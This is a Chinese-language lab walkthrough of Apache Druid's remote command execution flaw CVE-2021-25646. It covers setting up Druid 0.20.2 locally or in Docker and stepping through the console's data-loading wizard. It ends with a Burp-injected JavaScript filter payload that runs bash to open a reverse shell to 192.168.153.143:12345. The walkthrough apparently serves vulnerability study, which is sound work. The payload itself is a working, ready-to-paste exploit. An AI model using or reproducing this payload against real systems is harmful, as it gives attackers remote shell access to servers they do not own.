01

组件说明

  

  

  
  

Apache Druid是一个实时分析型数据库，旨在对大型数据集进行快速的查询分析（"OLAP"查询)。Druid最常被当做数据库来用以支持实时摄取、高性能查询和高稳定运行的应用场景，同时，Druid也通常被用来助力分析型应用的图形化界面，或者当做需要快速聚合的高并发后端API，Druid最适合应用于面向事件类型的数据

02

漏洞分析

  

  

  
  

访问 : https://mirrors.ocf.berkeley.edu/apache/druid/0.20.2/  

进行apche druid下载

![](../Images/75e91ae54c6d020abd36357b90d263bb.png)

![](../Images/d5c3a702dbec005e313360b8e27c8eca.png)

进行压缩包解压以及启动druid：

*   
*   
*   

```
tar -zxvcf apache-druid-0.20.2-bin.tar.gz #解压缩包 cd apache-druid-0.20.2/  #进入目录./bin/start-micro-quickstart  #启动druid
```

**docker部署： **

*   
*   

```
docker pull fokkodriesprong/docker-druiddocker run --rm -i -p 8888:8888 fokkodriesprong/docker-druid
```

**启动后是这样的：**  

![](../Images/40d417f68ae9bbfa2251bbb096b853cf.png)

![](../Images/32cabaa902108e81269fcad8927ad883.png)

*   Apache Druid 远程命令执行漏洞（CVE-2021-25646)
    
    点击 load data , 再点击 local disk
    

![](../Images/162d0f856b308234c8a878ea83712589.png)

进入页面后，在"Base directory"处填入"quickstart/tutorial/"、

在"File filter"处填入"wikiticker-2015-09-12-sampled.json.gz"

![](../Images/cf20ff13b8d47cd593c7089900fbd247.png)  

一直点击Next 直到 Filter

使用Burp抓包，添加filter内容：

  

![](../Images/1968a96a1b13b0da66903135237a8e54.png)  

  

使用Burp抓包，添加filter内容：

  

*   
*   
*   
*   
*   
*   
*   

```
,"filter":{"type": "javascript",          "function": "function(value){return java.lang.Runtime.getRuntime().exec('/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/192.168.153.143/12345 0>&1')}",          "dimension": "added",          "": {            "enabled": "true"          }
```
